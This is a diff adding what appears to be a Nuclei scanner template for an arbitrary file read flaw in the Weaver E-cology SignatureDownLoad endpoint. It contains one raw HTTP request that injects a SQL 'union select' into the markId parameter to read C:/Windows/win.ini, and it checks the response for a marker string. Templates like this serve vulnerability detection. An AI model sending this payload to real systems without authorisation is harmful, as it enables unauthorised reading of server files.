@@ -1,0 +1,28 @@
+id: WeaverE-colory-SignatureDownLoad-File-Read
+
+info:
+  name: 泛微E-colory接口SignatureDownLoad任意文件读取
+  author: htq
+  severity: high
+
+http:
+  - raw:
+    - |
+      @timeout 30s
+      GET /weaver/weaver.file.SignatureDownLoad?markId=0%20union%20select%20%27C:/Windows/win.ini%27 HTTP/1.1
+      Host: {{Hostname}}
+      User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.137 Safari/4E423F
+      Connection: close
+      Accept: */*
+      Accept-Language: en
+      Accept-Encoding: gzip
+
+    matchers-condition: and
+    matchers:
+    - type: word
+      part: body
+      words:
+        - "; for 16-bit app support"
+    - type: status
+      status:
+        - 200
